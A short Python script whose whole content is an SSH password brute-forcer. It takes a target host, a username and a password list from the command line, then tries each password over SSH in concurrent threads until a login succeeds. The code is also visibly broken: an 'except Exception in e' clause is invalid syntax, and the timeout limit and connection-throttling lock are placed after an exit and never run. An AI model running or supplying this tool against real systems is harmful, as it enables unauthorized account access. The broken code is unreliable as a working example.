from pexpect import pxssh
import optparse
import time
from threading import *
maxconnection = 5
connection_lock = BoundedSemaphore(value=maxconnection)
found = False
fails = 0
def connect(host, user, password, release):
      global found
      global fails
      try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            print ('[+] Password Found:' + password)
            found = True
      except Exception in e :
            if 'read_nonblocking' in str(e):
                  fails += 1
                  time.sleep(5)
                  connect(host, user, password, False)
            elif 'synchronize with original prompt' in str(e):
                   time.sleep(1)
                   connect(host, user, password, False)
      finally:
            if release:
                  connection_lock.release()

def main():
      parser = optparse.OptionParser('USAGE : '+'-H <target host> -U <user> -F <password list>')
      parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
      parser.add_option('-F', dest='passwdfile', type='string', help='specify password file')
      parser.add_option('-U', dest='user', type='string',help='specify the user')
      (options, args) = parser.parse_args()
      host = options.tgtHost
      passwdfile = options.passwdfile
      user = options.user
      if (host == None) or (passwdfile == None) or (user == None) :
            print (parser.usage)
            exit(0)
      file = open(passwdfile, 'r')
      for line in file.readlines():
            if found:
                  print ("[*] Exiting: Password Found")
                  exit(0)
                  if fails > 5:
                        print ("[!] Exiting: Too Many Socket Timeouts")
                        exit(0)
                  connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print ("[-] Testing: "+ str(password))
            t = Thread(target=connect, args=(host, user,password, True))
            child = t.start()

if __name__ == '__main__':
      main()
                                       
